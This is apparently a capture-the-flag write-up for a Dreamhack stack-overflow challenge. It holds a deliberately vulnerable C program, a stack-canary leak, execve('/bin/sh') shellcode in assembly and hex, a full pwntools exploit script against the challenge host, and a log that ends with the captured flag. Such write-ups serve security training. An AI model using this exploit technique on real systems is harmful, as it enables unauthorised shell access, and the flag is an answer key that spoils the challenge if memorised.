### Overview
This challenge require knowledge about how shellcode work on stack.
And how to write assembly code to explooit and get RCE
Now, let's break it down

```
$ checksec r2s
[*] '/home/khanh/Documents/WorkSpaceDreamHack/PWN-dreamhack/return2shellcode/r2s'
    Arch:       amd64-64-little
    RELRO:      Full RELRO
    Stack:      Canary found
    NX:         NX unknown - GNU_STACK missing
    PIE:        PIE enabled
    Stack:      Executable
    RWX:        Has RWX segments
    Stripped:   No
```
Since Canary found and PIE enabled, we must know Canary address.

Let's take a look at main function:

```py
// Name: r2s.c
// Compile: gcc -o r2s r2s.c -zexecstack

#include <stdio.h>
#include <unistd.h>

void init() {
  setvbuf(stdin, 0, 2, 0);
  setvbuf(stdout, 0, 2, 0);
}

int main() {
  char buf[0x50];

  init();

  printf("Address of the buf: %p\n", buf);
  printf("Distance between buf and $rbp: %ld\n",
         (char*)__builtin_frame_address(0) - buf);

  printf("[1] Leak the canary\n");
  printf("Input: ");
  fflush(stdout);

  read(0, buf, 0x100);
  printf("Your input is '%s'\n", buf);

  puts("[2] Overwrite the return address");
  printf("Input: ");
  fflush(stdout);
  gets(buf);

  return 0;
}
```

We can see that it is a common pwn challenge:
* One input used to leak address
* Second one used to override return address to shellcode
* Leak distance between buf and saved rbp is 96

And the key is they also leak buf address, it's also hint that we should do somethings with buf address

So let's check vmmap:
```
0x00007ffffffdd000 0x00007ffffffff000 0x0000000000000000 rwx [stack]
```
I saw that stack is executable, and the key point is that:
* we will use buf as shellcode to execute
* And override return address to buf

### Exploitation

Because we known that the distance between saved rbp and buf is 96 bytes, 
the distance between buf and Canary is 88 bytes

Let's use first input to leak Canary address:

``payload = b'A'*89``

it will leak address of Canary, store it and move to the next input
The final payload will be like this:

`` 88bytes buf + canary + 8bytes rbp + return address``

Our goal is override return address by buf address.
And modify `buf` as shell code when the program return back and it will execute shellcode for us.

Shellcode to execute ``execve('/bin/sh', 0, 0)``
```
mov rax, 0x68732f6e69622f
push rax
mov rdi, rsp  ; rdi = "/bin/sh\x00"
xor rsi, rsi  ; rsi = NULL
xor rdx, rdx  ; rdx = NULL
mov rax, 0x3b ; rax = sys_execve
syscall       ; execve("/bin/sh", null, null)
```

Assemble it to shellcode in hex, we will have the final script:
```py
from pwn import *
p = remote("host1.dreamhack.games", 23689)

payload = b'A'*89
p.recvuntil(b"buf: ")
buf = int(p.recvline().strip(), 16)
print(hex(buf))

shellcode = b'\x48\xB8\x2F\x62\x69\x6E\x2F\x73\x68\x00\x50\x48\x89\xE7\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05'

p.sendafter("Input: ", payload)
p.recvuntil(payload)

canary = u64(b'\x00' + p.recv(7))
print(hex(canary))

payload2 = shellcode.ljust(88, b'A')  + p64(canary)*2 + p64(buf)
p.recvuntil(b'the return address')
p.sendafter(b"Input: ",payload2)
p.interactive()
```
### result
```
$ python3 exploit.py
[+] Opening connection to host1.dreamhack.games on port 23689: Done
0x7fff37018db0
/home/khanh/.local/lib/python3.12/site-packages/pwnlib/tubes/tube.py:831: BytesWarning: Text is not bytes; assuming ASCII, no guarantees. See https://docs.pwntools.com/#bytes
  res = self.recvuntil(delim, timeout=timeout)
0x67cb90869e8e6d00
[*] Switching to interactive mode
$ ls
$ ls
flag
r2s
$ cat flag
DH{333eb89c9d2615dd8942ece08c1d34d5}
$ 
[*] Interrupted
[*] Closed connection to host1.dreamhack.games port 23689
```


